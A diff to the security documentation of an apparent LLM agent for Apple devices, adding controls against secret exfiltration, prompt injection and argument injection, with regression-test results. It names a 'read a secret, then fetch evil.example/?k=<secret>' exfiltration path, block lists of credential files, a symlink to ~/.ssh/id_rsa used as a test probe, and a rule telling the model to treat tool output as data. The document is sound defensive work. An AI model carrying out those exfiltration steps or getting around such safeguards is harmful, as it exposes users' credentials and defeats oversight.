@@ -6,7 +6,7 @@ iAgent runs an LLM that can read files, run commands and act on your Apple devic
 - the controls that do it, mapped to the standards they come from,
 - the risks that remain.
 
-The last review was on 2026-10-11 against v0.3.0. Every control below has a regression test that tries to break it, listed under "How it was verified".
+The last review was on 2026-10-13 against v0.3.0. Every control below has a regression test that tries to break it, listed under "How it was verified".
 
 ## Threat model
 
@@ -28,18 +28,20 @@ The last review was on 2026-10-11 against v0.3.0. Every control below has a regr
 |---|---|---|---|
 | none | Read-only, inside the project: read/glob/grep in the working dir, device scans, listing reminders/events/simulators, battery | – | – |
 | ask | Changes: writes in the project, reminders/calendar/notes edits, installs, every simulator and device action except listing | skips | per tool action |
-| ask, scoped | `bash` (the exact, complete command), `applescript` (the exact script and arguments), `mac open` (the exact target and app), `shortcuts run` (one shortcut), `web_fetch` (one host), `simulator openurl` (one URL), file access outside the working dir (one directory) | skips | that exact scope only |
+| ask, scoped | `bash` (the exact, complete command), `applescript` (the exact script and arguments), `mac open` (the exact target and app), `shortcuts run` (one shortcut), `web_fetch` (one host), `simulator openurl` (one URL), `ios_device raw` / `simulator raw` (the exact argument list), file access outside the working dir (one directory) | skips | that exact scope only |
 | sensitive | Secret/credential files (read or write), files that run code later (shell startup and login files, LaunchAgents, `.git/hooks`, `.git/config`, `~/.gitconfig`, `~/.config/git`, `~/.config/fish`) when written, sending messages | **still asks** | not offered |
 
 - Non-interactive runs refuse anything that isn't "none" unless you pass `--yolo`. "Sensitive" calls are refused in non-interactive runs, with or without `--yolo`.
 - Each approval prompt shows exactly what will run: the full command or script, the diff (up to 40 lines each side, with a count of the rest; an overwrite shows only the lines it changes), the message recipient and text, or, for other tools, every argument of the call.
-- A path given to any tool (device copies, screenshots, shortcut input, app installs) follows the same rules as `read_file`/`write_file`, so a secret file can't reach the model through a side door and a screenshot can't overwrite a shell startup file.
+- A path given to any tool (device copies, screenshots, shortcut input, app installs, message attachments, AirDrop items) follows the same rules as `read_file`/`write_file`, so a secret file can't reach the model or another person through a side door and a screenshot can't overwrite a shell startup file. The message prompt shows where a symlinked attachment really points.
+- File names are matched case-insensitively, like the default APFS volume: `.ZLOGIN` is the file zsh loads as `.zlogin`. Hooks and config of submodules and worktrees (`.git/modules/*/hooks`, `config.worktree`) count as files that run code later.
 
 ### Data exfiltration and secrets (OWASP LLM02, CWE-200/312/522/732)
 
 - **Secret files are never sent to a cloud model.** Reads of `.env*`, `.envrc`, `~/.ssh`, `~/.config/gh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, Keychains, `*.pem/*.key/*.p12`, `.netrc`, `.git-credentials`, `~/.iagent`, and similar are blocked outright (approval level `blocked`, which neither the user nor `--yolo` can override). In local-only mode they can be read after confirming each time. Writing them always needs confirmation.
 - **Secrets are masked before anything reaches the model** (`Redact`). This covers the user's messages, every tool result and error, and the project instruction files in the system prompt. Masked items: well-known token formats (Anthropic, OpenAI, GitHub, GitLab, Slack, AWS, Google, Stripe, npm, Hugging Face, JWT), private key blocks, URL passwords, `Bearer`/`Basic` tokens, `password=`/`token:`-style values containing letters and digits, the resolved API key, and the value of every environment variable whose name contains KEY, TOKEN, SECRET, PASSWORD, CREDENTIAL or AUTH. The user sees a "masked N secrets" notice each time.
 - **Symlinks are resolved first.** So `innocent.txt -> ~/.ssh/id_rsa` is caught.
+- **Project instruction files follow the same rules.** `AGENTS.md`, `CLAUDE.md` and `.iagent.md` are loaded into the system prompt only if they are regular files inside the project, up to 1 MB. A repo can't make one a symlink to `.env` or `~/.aws/credentials`.
 - **`grep` never opens secret files.** It tells the model how many it skipped.
 - **`web_fetch` asks per host.** This closes the "read a secret, then fetch `evil.example/?k=<secret>`" path. The other ways to reach a URL ask too: `mac open` per exact target and `simulator openurl` per exact URL.
 - **API keys are removed from child processes.** `bash`, `osascript` and every helper run without `*_API_KEY` in their environment, including any custom `apiKeyEnv`.
@@ -59,7 +61,7 @@ In this mode, no data leaves the machine:
 
 - **HTTPS with TLS 1.2 or later** is required for model APIs. Plain `http://` works only for loopback/LAN servers such as Ollama or LM Studio, unless you set `allowInsecureHTTP: true`.
 - **Model API requests never follow redirects,** so an API key header can't be replayed to another host.
-- **`web_fetch` follows redirects only within the approved host.** It has its own credential-less session.
+- **`web_fetch` follows redirects only within the approved host,** and never from https to http. It has its own credential-less session.
 
 ### Injection (CWE-78, CWE-88, CWE-150, OWASP LLM05)
 
@@ -67,13 +69,14 @@ In this mode, no data leaves the machine:
 - **Script values are passed as arguments.** AppleScript/JXA values are separated from the script by `--` and never spliced into it.
 - **Option-looking values are rejected.** Device ids, bundle ids, app names, shortcut names and URLs starting with `-` are refused. `say` reads its text from stdin.
 - **Terminal output is sanitized.** Model output, tool output, previews and server errors all pass through the sanitizer before printing. ESC, CR, other control characters, bidi overrides and zero-width characters become visible markers (`␛`, `␍`, `⟨U+202E⟩`). So nothing can retitle the window, erase lines, write the clipboard over OSC 52, or fake an approval prompt.
-- **Untrusted content is labeled.** The system prompt tells the model to treat tool output as data. Web content is wrapped in `<untrusted_web_content>`.
+- **Untrusted content is labeled.** The system prompt tells the model to treat tool output as data. Web content is wrapped in `<untrusted_web_content>`, and a closing tag inside the page is defused so it can't end the wrapper early.
 
 ### Resource limits (OWASP LLM10, CWE-400/770)
 
 - `read_file` is limited to 20 MB, `web_fetch` downloads to 5 MB, and command output to 10 MB.
 - Tool results sent to the model are cut at 30k characters.
-- Commands time out after 120 s by default (600 s max).
+- Commands time out after 120 s by default (600 s max). A timeout or Ctrl-C sends SIGTERM to the command's whole process group, then SIGKILL after 2 s. A background child (`server &`) that keeps the output pipe open doesn't hold up the result.
+- Numeric tool arguments are clamped, so an out-of-range value (`limit: -5`, `offset: 1e300`) gets an error or a clamped value instead of crashing the session.
 - A single request is limited to 60 model calls.
 
 ### Binary and platform (Apple platform security, OWASP LLM03 Supply Chain)
@@ -126,10 +129,12 @@ Each control was tested with harmless payloads on macOS 26.7. These probes are a
   - A `say -o` value didn't create the file.
   - An osascript argument `-e <payload>` arrived as plain data.
   - The bundle id `--erase` was rejected.
-- **Transport:** plain HTTP to a remote host was refused. A 307 redirect on the API was refused, and the redirect target never received the `Authorization` header. A cross-host `web_fetch` redirect wasn't followed.
+- **Transport:** plain HTTP to a remote host was refused, including names that only start like a LAN address (`10.0.0.1.evil.example`). A 307 redirect on the API was refused, and the redirect target never received the `Authorization` header. A cross-host `web_fetch` redirect wasn't followed.
 - **API keys:** `$OPENAI_API_KEY` was empty inside `bash`.
 - **Secret masking:** API keys of each known format, private key blocks, URL passwords, `.env`-style values and registered env values were masked in tool results. Ordinary code such as `apiKey = config.apiKey` was left alone, and a full scan of this repository masked only the test fixture. A `read_file` of `.env` was blocked even with `--yolo`.
 - **Local-only mode:** Anthropic and LAN model servers were refused. `web_fetch` was not offered and `mac open` was blocked. Inside sandboxed `bash`, `curl https://…`, raw sockets, DNS lookups, `open URL` and Apple Events to Finder and Mail all failed (compared against an unsandboxed run where the network worked), while git, swift and python ran normally.
-- **Resource limits:** 30 MB of output was capped at 10 MB.
+- **Resource limits:** 30 MB of output was capped at 10 MB. `sleep 10 &` returned at once, and a command that traps SIGTERM was killed at its timeout. Out-of-range `read_file` numbers didn't crash.
+- **Case and nesting:** new `.ENVRC`, `.ZLOGIN` and `.Git/Hooks/…` writes asked every time, and so did `.git/modules/<sub>/hooks` and `config.worktree`.
+- **Side doors:** a `messages` attachment or AirDrop item symlinked to `~/.ssh/id_rsa` was blocked, and an `AGENTS.md -> .env` symlink was left out of the system prompt.
 - **Messages:** refused non-interactively even with `--yolo`.
 - **Signed build:** passes `codesign --verify --strict` with the `runtime` flag.
